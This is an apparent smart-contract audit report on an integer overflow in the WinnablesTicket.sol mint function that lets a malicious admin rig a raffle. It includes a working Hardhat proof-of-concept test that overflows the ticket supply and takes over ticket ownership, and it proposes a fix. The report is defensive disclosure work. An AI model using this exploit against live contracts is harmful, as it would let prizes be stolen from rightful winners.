# WinnableTicket.sol mint can be overflowed allowing malicious admin to steal tickets

### Summary

This breaks the invariants specified by the sponser: 

- Admins cannot affect the odds of a raffle
- Winnables admins cannot do anything to prevent a winner from withdrawing their prize (malicious admin is stealing prize from rightful winner)

Steps:

1. A raffle is created and users enter normally. 
2. just before the raffle closes, malicious admin performs several transactions. 
3. first they mint x tickets to themselves such that _supplies[id] = 0 through an overflow and _balances[id][adminAddress] = x. This sets _ticketOwnership[id][0] to the admin address, which previously was the first user to mint tickets. 
4. next they mint y tickets such that the next ticket minted will override the _ticketOwnership[id][startId] = secondUserAddress to their own address. the admin can repeat this in such a way that given enough gas, the admin address is returned for all possible ticket ids when ownerOf is called. A more efficient attack will only continue until supplyOf(ticketId) is equal to the minimum tickets sold for a drawing to happen.
5. When the winning ticket is drawn it gets the totalSupply(id) of the raffle, which will return with total amount the malicious admin minted after overflowing _supplies[id] to 0. 
6. the owner of all id's considered for the raffle winner will be the malicious admin, guaranteeing them the prize. 

### Root Cause

WinnablesTicket.sol allows the admin to mint tickets. The sponsors have said that admins granting free tickets is expected and granting themselves free tickets only reduces their earnings potential because of the existence of max ticket supply. However the mint function in WinnablesTicket.sol has this unchecked addition to supplies: 
https://github.com/sherlock-audit/2024-08-winnables-raffles/blob/main/public-contracts/contracts/WinnablesTicket.sol#L182-L199

with no validation of the amount. an admin can effectively set supplies to whatever amount they choose with an overflow. 


### Attack Path

Admin of WinnableTicket.sol grants themselves minter role, and directly calls mint() function. 

### Impact

Raffles can be rigged to guarentee malicious admin wins the raffle. 

### PoC

I have provided a test showing how an admin can steal user funds here. This is meant to be added to the 'Ownership and admin functions' portion of ticket.js. 

```javascript
it('mints ticket, overflows supplies, passess', async () => {
      await (await ticket.setRole(signers[0].address, 1, true)).wait();
    // mint tickets to user, simulate raffle
    // startid - 0
    await (await ticket.mint(signers[1].address, 1, BigNumber.from(10))).wait();
    // balance user - 10
    // userStartId - 0
    // ticketOwnership[1][0] = user
    // balance admin - 0
    // supply - 10
    expect(await ticket.balanceOf(signers[1].address, 1)).to.eq(BigNumber.from(10));
    expect(await ticket.ownerOf(1, 9)).to.eq(signers[1].address)
    console.log('supplyOf before overflow', await ticket.supplyOf(1));

    // mint up to 2^256 - 10 tickets to self, overflowing the supply to 0
    await (await ticket.mint(signers[0].address, 1, BigNumber.from(2).pow(256).sub(10))).wait();
    expect(await ticket.supplyOf(1)).to.eq(BigNumber.from(0));
    // admin has stolen users tickets, but needs to remint them
    // expect(await ticket.ownerOf(1, 9)).to.eq(signers[0].address);  
    console.log('supplyOf after overflow', await ticket.supplyOf(1));
    // balance user - 10
    // adminstartId - 0
    // ticketOwnership[1][0] = admin
    // balance admin - 2^256 - 10
    // supply - 0
    // mint 20 more tickets to self, stealing first users tickets
    await (await ticket.mint(signers[0].address, 1, BigNumber.from(20))).wait();
    // balance user - 10
    // adminStartId - 0
   // balance admin - 10


    console.log('supplyOf after minting 10 more', await ticket.supplyOf(1));
    console.log('balanceOf self', await ticket.balanceOf(signers[0].address, 1));
    expect(await ticket.balanceOf(signers[0].address, 1)).to.eq(10);
    expect(await ticket.supplyOf(1)).to.eq(20);
    // at this point, token.supplyOf is 20 and balance of admin is 10. 
    // but, ownerOf will show that admin owns all tickets, as it is the last one to mint. 
    // since uint256 winningTicketNumber = request.randomWord % supply; 
    // the winning ticket number will be randomword % 20, or between 0 or 19. 
    // the winning address is determined by 'return IWinnablesTicket(TICKETS_CONTRACT).ownerOf(request.raffleId, 
    // winningTicketNumber);'
    // all possible ticket ids will show the malicious admin as the owner. 
    expect(await ticket.ownerOf(1, 19)).to.eq(signers[0].address);
    });
```



### Mitigation

remove the unchecked code block in WinnablesTicket.mint(). 

```solidity
  function mint(address to, uint256 id, uint256 amount) external onlyRole(1) {
    if (to == address(0)) {
      revert TransferToAddressZero();
    }
    address operator = msg.sender;
    uint256 startId = _supplies[id];


      _balances[id][to] += amount;
      _supplies[id] = startId + amount;
    

    _ticketOwnership[id][startId] = to;
    emit NewTicket(id, startId, amount);
    emit TransferSingle(operator, address(0), to, id, amount);

    _doSafeTransferAcceptanceCheck(operator, address(0), to, id, amount);
  }
```
